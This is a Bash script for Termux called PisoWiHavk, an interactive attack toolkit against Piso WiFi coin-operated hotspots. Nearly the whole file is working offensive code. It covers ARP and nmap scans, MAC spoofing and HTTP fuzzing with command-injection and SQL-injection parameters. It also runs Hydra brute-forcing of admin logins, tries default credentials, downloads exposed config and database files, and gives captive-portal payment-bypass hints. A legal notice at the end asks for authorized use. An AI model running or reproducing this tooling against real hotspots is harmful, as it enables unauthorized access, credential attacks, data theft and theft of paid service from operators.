#!/usr/bin/env bash
# PisoWiHavk - Developed by Tidegliders
# Real Deployment Edition: Includes deep HTTP fuzzing, ARP scan, MAC spoofing (if root), extended logging, and more.

# ========= GLOBALS & BANNER =========
AUTHOR="Tidegliders"
VERSION="2.0"
SCRIPT_NAME="PisoWiHavk"
LOGFILE="$HOME/PisoWiHavk.log"
TMPDIR=$(mktemp -d -p "$HOME" PisoWiHavk_XXXXXX)
export TMPDIR

RED='\033[0;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

banner() {
cat <<EOF

${CYAN}╔════════════════════════════════════════════════════════════════════╗
║  ██████╗ ██╗███████╗ ██████╗  █████╗ ██╗    ██╗██╗  ██╗           ║
║ ██╔════╝ ██║██╔════╝██╔════╝ ██╔══██╗██║    ██║╚██╗██╔╝           ║
║ ██║  ███╗██║█████╗  ██║  ███╗███████║██║ █╗ ██║ ╚███╔╝            ║
║ ██║   ██║██║██╔══╝  ██║   ██║██╔══██║██║███╗██║ ██╔██╗            ║
║ ╚██████╔╝██║███████╗╚██████╔╝██║  ██║╚███╔███╔╝██╔╝ ██╗           ║
║  ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝           ║
║      PisoWiHavk by ${AUTHOR} | v${VERSION} | Real Deployment       ║
╚════════════════════════════════════════════════════════════════════╝${NC}
EOF
}

# ========= DEPENDENCY SETUP =========
REQUIRED_PKGS="nmap curl jq termux-api netcat ipcalc coreutils grep sed awk tsu arp-scan macchanger hydra"
install_pkg() {
    echo -e "${YELLOW}[INFO] Installing missing packages: $REQUIRED_PKGS${NC}"
    pkg install -y $REQUIRED_PKGS

    # Install python3 for HTTP fuzzing module if not present
    if ! command -v python3 >/dev/null 2>&1; then
        pkg install -y python
    fi
    pip install --upgrade requests >/dev/null 2>&1
}

check_and_install_pkg() {
    echo -e "${YELLOW}[INFO] Checking for required packages...${NC}"
    for pkg in $REQUIRED_PKGS; do
        if ! command -v $pkg >/dev/null 2>&1; then
            echo -e "${YELLOW}[INFO] Package $pkg is not installed. Installing...${NC}"
            if ! pkg install -y $pkg; then
                echo -e "${RED}[ERROR] Failed to install package $pkg. Please check your internet connection and try again.${NC}"
                exit 1
            fi
            echo -e "${GREEN}[SUCCESS] Package $pkg installed successfully.${NC}"
        else
            echo -e "${GREEN}[INFO] Package $pkg is already installed.${NC}"
        fi
    done

    # Install python3 for HTTP fuzzing module if not present
    if ! command -v python3 >/dev/null 2>&1; then
        echo -e "${YELLOW}[INFO] Python3 is not installed. Installing...${NC}"
        if ! pkg install -y python; then
            echo -e "${RED}[ERROR] Failed to install Python3. Please check your internet connection and try again.${NC}"
            exit 1
        fi
        echo -e "${GREEN}[SUCCESS] Python3 installed successfully.${NC}"
    else
        echo -e "${GREEN}[INFO] Python3 is already installed.${NC}"
    fi

    # Install requests library for HTTP fuzzing module
    if ! pip show requests >/dev/null 2>&1; then
        echo -e "${YELLOW}[INFO] Requests library is not installed. Installing...${NC}"
        if ! pip install --upgrade requests >/dev/null 2>&1; then
            echo -e "${RED}[ERROR] Failed to install requests library. Please check your internet connection and try again.${NC}"
            exit 1
        fi
        echo -e "${GREEN}[SUCCESS] Requests library installed successfully.${NC}"
    else
        echo -e "${GREEN}[INFO] Requests library is already installed.${NC}"
    fi
}

# ========= LOGGING & UTILITIES =========
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $*"
    echo -e "$msg" | tee -a "$LOGFILE"
}

pause() { read -rp "$(echo -e "${YELLOW}Press Enter to continue...${NC}")"; }

print_section() {
    echo -e "\n${BLUE}========== $* ==========${NC}\n"
}

spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
}

error_exit() {
    log "[ERROR] $*"
    exit 1
}

# ========= NETWORK INFO =========
get_wifi_info() {
    print_section "WIFI INFORMATION"
    termux-wifi-connectioninfo > "$TMPDIR/wifiinfo.json"
    SSID=$(jq -r '.ssid' "$TMPDIR/wifiinfo.json")
    IP=$(jq -r '.ip' "$TMPDIR/wifiinfo.json")
    GATEWAY=$(jq -r '.gateway' "$TMPDIR/wifiinfo.json")
    MAC=$(jq -r '.macAddress' "$TMPDIR/wifiinfo.json")
    NETMASK=$(jq -r '.netmask' "$TMPDIR/wifiinfo.json")
    CIDR=$(ipcalc -p "$IP" "$NETMASK" | awk -F= '/PREFIX/ {print $2}')
    NETWORK=$(ipcalc -n "$IP" "$NETMASK" | awk -F= '/NETWORK/ {print $2}')
    NETWORK_CIDR="$NETWORK/$CIDR"
    echo -e "${GREEN}SSID: $SSID"
    echo -e "IP: $IP"
    echo -e "Gateway: $GATEWAY"
    echo -e "MAC: $MAC"
    echo -e "Netmask: $NETMASK"
    echo -e "Network: $NETWORK_CIDR${NC}"
    log "[INFO] WiFi info: SSID=$SSID, IP=$IP, GATEWAY=$GATEWAY, MAC=$MAC, NETMASK=$NETMASK, NETWORK=$NETWORK_CIDR"
}

# ========= ARP SCANNER =========
arp_scan() {
    print_section "ARP SCAN (NETWORK ENUMERATION)"
    echo -e "${YELLOW}Scanning for all devices via ARP...${NC}"
    sudo arp-scan --interface=wlan0 "$NETWORK_CIDR" > "$TMPDIR/arp-scan.txt" 2>/dev/null
    cat "$TMPDIR/arp-scan.txt" | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | tee "$TMPDIR/arp-active.txt"
    log "[INFO] ARP scan completed."
}

# ========= MAC SPOOFING (Root Required) =========
mac_spoof() {
    print_section "MAC SPOOFING (ROOT ONLY)"
    sudo macchanger -s wlan0
    read -rp "Change MAC to (r for random, m for manual, q to quit): " macopt
    if [ "$macopt" = "r" ]; then
        sudo ip link set wlan0 down
        sudo macchanger -r wlan0
        sudo ip link set wlan0 up
        sudo macchanger -s wlan0
        log "[INFO] MAC randomized."
    elif [ "$macopt" = "m" ]; then
        read -rp "Enter new MAC address (e.g. 00:11:22:33:44:55): " newmac
        sudo ip link set wlan0 down
        sudo macchanger --mac="$newmac" wlan0
        sudo ip link set wlan0 up
        sudo macchanger -s wlan0
        log "[INFO] MAC set to $newmac"
    else
        echo "Aborted."
    fi
}

# ========= NETWORK DEVICE SCAN =========
scan_network_devices() {
    print_section "NETWORK DEVICE SCAN"
    echo -e "${YELLOW}Scanning your WiFi ($NETWORK_CIDR) for active devices...${NC}"
    nmap -sn "$NETWORK_CIDR" -oG "$TMPDIR/nmap-scan.txt" | tee "$TMPDIR/nmap-output.log"
    grep "Up$" "$TMPDIR/nmap-scan.txt" | awk '{print $2}' > "$TMPDIR/devices.txt"
    echo -e "${GREEN}Discovered Devices:${NC}"
    nl -w2 -s'. ' "$TMPDIR/devices.txt"
    log "[INFO] Network device scan complete."
}

# ========= DEEP HTTP FUZZING =========
http_fuzz() {
    print_section "HTTP FUZZING"
    read -rp "Enter target IP (e.g. 192.168.1.1): " target
    read -rp "Enter admin path to fuzz (e.g. /admin/, /cpanel/, /): " admin_path
    echo -e "${YELLOW}Starting deep HTTP fuzzing against $target$admin_path${NC}"
    cat > "$TMPDIR/fuzzer.py" <<EOF
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys

target = "http://$target$admin_path"
user_agents = [
    "Mozilla/5.0", "curl/7.68.0", "python-requests/2.25.1",
    "sqlmap", "Wget/1.21", "Nmap Scripting Engine"
]
paths = ["admin", "cpanel", "login", "dashboard", "config", "debug", "panel", "shell", "env", "test", "backup"]
params = ["?user=admin", "?debug=1", "?test=on", "?cmd=whoami", "?page=1' OR '1'='1"]
for ua in user_agents:
    for p in paths:
        for param in params:
            url = f"http://$target/{p}{param}"
            try:
                r = requests.get(url, headers={"User-Agent": ua}, timeout=3, verify=False)
                if r.status_code in [200,401,403]:
                    print(f"[+] {url} [{r.status_code}] -- UA: {ua}")
            except Exception as e:
                pass
EOF
    python3 "$TMPDIR/fuzzer.py" | tee "$TMPDIR/fuzz-results.txt"
    log "[INFO] HTTP fuzzing run for $target$admin_path"
}

# ========= EXTENDED LOGGING MODULE =========
show_logs() {
    print_section "LOG FILE"
    tail -n 50 "$LOGFILE"
    echo -e "${YELLOW}Full log at $LOGFILE${NC}"
}

# ========= HYDRA BRUTEFORCE (WEB FORM) =========
hydra_brute() {
    print_section "ADMIN PASSWORD BRUTEFORCE (Hydra Web Form)"
    read -rp "Enter target IP: " target
    read -rp "Enter web login path (e.g. /admin/login.php): " path
    read -rp "Enter username field name: " userfield
    read -rp "Enter password field name: " passfield
    read -rp "Enter success indicator phrase (e.g. dashboard, logout): " success
    echo -e "${YELLOW}Running hydra, you need a wordlist at $HOME/wordlist.txt${NC}"
    hydra -L $HOME/wordlist.txt -P $HOME/wordlist.txt "$target" http-post-form "$path:$userfield=^USER^&$passfield=^PASS^:$success" -V | tee "$TMPDIR/hydra.txt"
    log "[INFO] Hydra brute run for $target$path"
}

# ========= VULNERABILITY CHECKS =========
declare -A VULN_SUMMARY

check_default_admin_page() {
    print_section "CHECK: DEFAULT ADMIN PAGE"
    local target="$1"
    local found=0
    for url in "http://$target/admin/" "http://$target/admin" "http://$target/cpanel/" "http://$target/login"; do
        if curl -m 3 -sL "$url" | grep -qi "<form"; then
            echo -e "${RED}[!] Possible admin login page found at: $url${NC}"
            VULN_SUMMARY["Default_Admin_Page"]="VULNERABLE"
            echo "$url" > "$TMPDIR/admin-url.txt"
            found=1
            break
        fi
    done
    [ $found -eq 0 ] && echo -e "${GREEN}[OK] No open admin login page found.${NC}"
}

check_default_creds() {
    print_section "CHECK: DEFAULT CREDENTIALS (admin/admin, admin/piso, etc.)"
    local url
    url=$(<"$TMPDIR/admin-url.txt" 2>/dev/null || echo "")
    if [ -z "$url" ]; then
        echo -e "${YELLOW}No admin page detected. Skipping cred check.${NC}"
        return
    fi
    for user in admin root user; do
        for pass in admin piso 1234 password root; do
            resp=$(curl -sL --data "username=$user&password=$pass" "$url")
            if echo "$resp" | grep -Eqi "dashboard|logout|welcome"; then
                echo -e "${RED}[!] Default/weak credentials work: $user/$pass${NC}"
                VULN_SUMMARY["Default_Creds"]="VULNERABLE"
                return
            fi
        done
    done
    echo -e "${GREEN}[OK] Default credentials rejected.${NC}"
}

check_http_admin() {
    print_section "CHECK: UNENCRYPTED HTTP ADMIN"
    local target="$1"
    for port in 80 8080; do
        if nc -z -w2 "$target" "$port"; then
            echo -e "${RED}[!] HTTP admin open on port $port${NC}"
            VULN_SUMMARY["HTTP_Admin"]="VULNERABLE"
            return
        fi
    done
    echo -e "${GREEN}[OK] No HTTP admin detected on common ports.${NC}"
}

check_open_config_files() {
    print_section "CHECK: OPEN CONFIG/DB FILES"
    local target="$1"
    for path in config.txt database.db settings.conf backup.zip; do
        url="http://$target/$path"
        if curl -m 2 -sL "$url" | grep -q -E '.{10}'; then
            echo -e "${RED}[!] Open file found: $url${NC}"
            VULN_SUMMARY["Open_Config"]="VULNERABLE"
        fi
    done
}

check_captive_portal_bypass() {
    print_section "CHECK: CAPTIVE PORTAL BYPASS"
    local target="$1"
    # Simulate possible bypass by trying access to Google DNS via their gateway
    if ping -c1 -W1 8.8.8.8 >/dev/null 2>&1; then
        echo -e "${RED}[!] Internet access possible without payment (captive portal weak)${NC}"
        VULN_SUMMARY["Captive_Portal_Bypass"]="VULNERABLE"
    else
        echo -e "${GREEN}[OK] Captive portal blocks traffic properly.${NC}"
    fi
}

check_open_ports() {
    print_section "CHECK: OPEN PORTS (Telnet/SSH/FTP)"
    local target="$1"
    nmap -p 21,22,23,80,8080,443 "$target" -oG "$TMPDIR/portscan.txt" | tee -a "$LOGFILE"
    grep "/open/" "$TMPDIR/portscan.txt" | awk '{print $2, $3, $4, $5}'
    if grep -q "21/open" "$TMPDIR/portscan.txt"; then
        VULN_SUMMARY["FTP"]="VULNERABLE"
    fi
    if grep -q "22/open" "$TMPDIR/portscan.txt"; then
        VULN_SUMMARY["SSH"]="VULNERABLE"
    fi
    if grep -q "23/open" "$TMPDIR/portscan.txt"; then
        VULN_SUMMARY["Telnet"]="VULNERABLE"
    fi
}

# ========= EXPLOIT UTILITIES =========
exploit_admin_access() {
    print_section "EXPLOIT: ADMIN ACCESS"
    local url
    url=$(<"$TMPDIR/admin-url.txt" 2>/dev/null || echo "")
    if [ -z "$url" ]; then
        echo -e "${YELLOW}No admin URL found. Run vulnerability scan first.${NC}"
        return
    fi
    echo -e "${CYAN}Opening admin page in browser: $url${NC}"
    termux-open-url "$url"
}

exploit_download_config() {
    print_section "EXPLOIT: DOWNLOAD CONFIG FILES"
    local target="$1"
    for path in config.txt database.db settings.conf backup.zip; do
        url="http://$target/$path"
        if curl -m 2 -sL "$url" | grep -q -E '.{10}'; then
            out="$TMPDIR/${path}_$target"
            curl -sL "$url" -o "$out"
            echo -e "${GREEN}[+] Downloaded: $out${NC}"
        fi
    done
}

exploit_captive_portal() {
    print_section "EXPLOIT: CAPTIVE PORTAL"
    local target="$1"
    echo -e "${YELLOW}Try using a VPN app, or changing your MAC address (root needed), or try incognito/private browser.${NC}"
}

exploit_default_creds() {
    print_section "EXPLOIT: DEFAULT CREDENTIALS"
    local url
    url=$(<"$TMPDIR/admin-url.txt" 2>/dev/null || echo "")
    if [ -z "$url" ]; then
        echo -e "${YELLOW}No admin URL found. Run vulnerability scan first.${NC}"
        return
    fi
    echo -e "${CYAN}Try these default creds in your browser at $url:${NC}\n"
    echo -e "admin:admin\nadmin:piso\nroot:root\nuser:1234"
}

exploit_telnet_ssh() {
    print_section "EXPLOIT: TELNET/SSH"
    local target="$1"
    echo -e "${YELLOW}Try connecting via:${NC}"
    echo -e "telnet $target\nssh root@$target"
    echo -e "${YELLOW}Common passwords: admin, piso, root, 1234${NC}"
}

# ========= VULNERABILITY SUMMARY =========
print_vuln_summary() {
    print_section "VULNERABILITY SUMMARY"
    for vuln in "Default_Admin_Page" "Default_Creds" "HTTP_Admin" "Open_Config" "Captive_Portal_Bypass" "FTP" "SSH" "Telnet"; do
        status="${VULN_SUMMARY[$vuln]}"
        [ -z "$status" ] && status="NOT DETECTED"
        echo -e "${CYAN}$vuln${NC}: ${RED}$status${NC}"
    done
    log "[INFO] Vulnerability summary displayed."
}

# ========= INTERACTIVE MENU =========
main_menu() {
    while true; do
        clear; banner
        echo -e "${GREEN}Welcome to $SCRIPT_NAME by $AUTHOR (Real Deployment Edition)${NC}"
        echo -e "${BLUE}Main Menu:${NC}"
        echo "1. Show WiFi/Network Info"
        echo "2. ARP Scan"
        echo "3. MAC Spoofing (root)"
        echo "4. Scan Network for Devices"
        echo "5. Deep HTTP Fuzzing"
        echo "6. Hydra Web-Form Brute (needs wordlist.txt)"
        echo "7. Vulnerability Scan (input admin IP)"
        echo "8. Exploit Utilities"
        echo "9. Print Vulnerability Summary"
        echo "10. Show Logs"
        echo "11. About/Help"
        echo "0. Exit"
        read -rp "$(echo -e "${YELLOW}Select option: ${NC}")" CH
        case "$CH" in
            1) get_wifi_info; pause ;;
            2) get_wifi_info; arp_scan; pause ;;
            3) mac_spoof; pause ;;
            4) get_wifi_info; scan_network_devices; pause ;;
            5) http_fuzz; pause ;;
            6) hydra_brute; pause ;;
            7) read -rp "Enter Piso WiFi Admin IP: " ADMIN_IP
               check_default_admin_page "$ADMIN_IP"
               check_default_creds
               check_http_admin "$ADMIN_IP"
               check_open_config_files "$ADMIN_IP"
               check_captive_portal_bypass "$ADMIN_IP"
               check_open_ports "$ADMIN_IP"
               pause ;;
            8) exploit_menu ;;
            9) print_vuln_summary; pause ;;
            10) show_logs; pause ;;
            11) about_help; pause ;;
            0) cleanup; exit 0 ;;
            *) echo "Invalid choice!"; sleep 1 ;;
        esac
    done
}

exploit_menu() {
    while true; do
        clear; banner
        echo -e "${BLUE}Exploit Utilities:${NC}"
        echo "1. Open Admin Page (if found)"
        echo "2. Download Config/DB Files"
        echo "3. Default Credentials List"
        echo "4. Telnet/SSH Utility"
        echo "5. Captive Portal Bypass Guide"
        echo "0. Back"
        read -rp "$(echo -e "${YELLOW}Exploit option: ${NC}")" CH
        case "$CH" in
            1) exploit_admin_access; pause ;;
            2) read -rp "Enter target IP: " ADMIN_IP
               exploit_download_config "$ADMIN_IP"; pause ;;
            3) exploit_default_creds; pause ;;
            4) read -rp "Enter target IP: " ADMIN_IP
               exploit_telnet_ssh "$ADMIN_IP"; pause ;;
            5) read -rp "Enter target IP: " ADMIN_IP
               exploit_captive_portal "$ADMIN_IP"; pause ;;
            0) break ;;
            *) echo "Invalid!"; sleep 1 ;;
        esac
    done
}

about_help() {
    print_section "ABOUT / HELP"
    cat <<EOF
PisoWiHavk is an all-in-one Piso WiFi vulnerability scanner and exploitation helper for Termux, developed by $AUTHOR.

Features:
- WiFi network scanning, ARP enumeration
- Automatic dependency installation
- MAC spoofing (root), deep HTTP fuzzing, brute-force modules
- Vulnerability checks: open admin, default creds, open config files, HTTP/HTTPS, captive portal, open ports
- Exploit helpers: browser opening, file download, login attempts
- Extended logs, summary, and robust interactive UI

Legal/Ethical Notice:
- Use only on networks you own or have permission to test.
- Unauthorized exploitation is illegal.
- For educational and authorized maintenance use only.

References:
- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things/
- OpenWRT Security: https://openwrt.org/docs/guide-user/security/start
- Nmap Documentation: https://nmap.org/book/man.html
EOF
}

cleanup() {
    rm -rf "$TMPDIR"
    echo -e "${GREEN}Cleaned up temporary files.${NC}"
    log "[INFO] Temporary files cleaned up."
}

# ========= INIT =========
trap cleanup EXIT
banner
echo -e "${YELLOW}[*] Checking and installing dependencies...${NC}"
check_and_install_pkg
log "[INFO] $SCRIPT_NAME v$VERSION started"
pause
main_menu
